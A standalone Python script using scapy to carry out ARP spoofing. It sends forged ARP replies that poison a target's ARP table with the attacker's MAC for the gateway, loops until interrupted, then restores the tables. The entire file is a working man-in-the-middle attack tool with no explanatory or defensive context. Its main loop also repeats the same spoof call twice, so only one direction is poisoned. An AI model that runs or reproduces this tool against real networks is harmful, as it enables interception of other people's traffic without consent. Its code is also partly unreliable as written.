#!/usr/bin/env python

import scapy.all as scapy
import time
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="specify target_ip")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="specify the gateway_ip or routers ip")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] please specify a target ip, use --help for more info.")
    elif not options.gateway_ip:
        parser.error("[-] please specify a gateway_ip, use --help for more info.")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    # arp_request.show()
    broadcast =scapy.Ether(dst  = "ff:ff:ff:ff:ff:ff")
    # broadcast.show()
    arp_request_broadcast = broadcast/arp_request
    # arp_request_broadcast.show()
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
    # print(answered_list.summary())
    # print(answered_list.summary())
    # print("IP\t\t\tMAC ADDRESS\n-----------------------------------------")
    mac = answered_list[0][1].hwsrc
    return mac
    # clients_list = []
    # for element in answered_list:
    #     client_dict = {"ip": element[1].psrc,"mac": element[1].hwsrc }
    #     clients_list.append(client_dict)
    #     # print(element[1].psrc + "\t\t"+ element[1].hwsrc)
    # return clients_list


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp_response = scapy.ARP(op= 2, pdst =target_ip, hwdst = target_mac, psrc = spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    packet = scapy.Ether(dst=target_mac) / arp_response
    scapy.sendp(packet, verbose=False)
    # scapy.send(packet,verbose = False)




def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    arp_response = scapy.ARP(op= 2, pdst = destination_ip, hwdst= destination_mac, psrc = source_ip, hwsrc = source_mac)
    packet = scapy.Ether(dst=destination_mac) / arp_response
    scapy.sendp(packet, count = 4, verbose=False)



number_of_packets_sent = 0
options = get_arguments()
# target_ip = "192.168.85.79"
target_ip = options.target_ip
# gateway_ip = "192.168.85.228"
gateway_ip = options.gateway_ip
try:
    while True:
        spoof(target_ip,gateway_ip)
        spoof(target_ip,gateway_ip)
        number_of_packets_sent +=2
        time.sleep(2)
        print("\r[+] number of packets sent: " + str(number_of_packets_sent), end="")
except KeyboardInterrupt:
    print("\n[+] CTRL+C detected ...... Resetting the ARP tables ...... Please wait")
    restore(gateway_ip,target_ip)
    restore(target_ip,gateway_ip)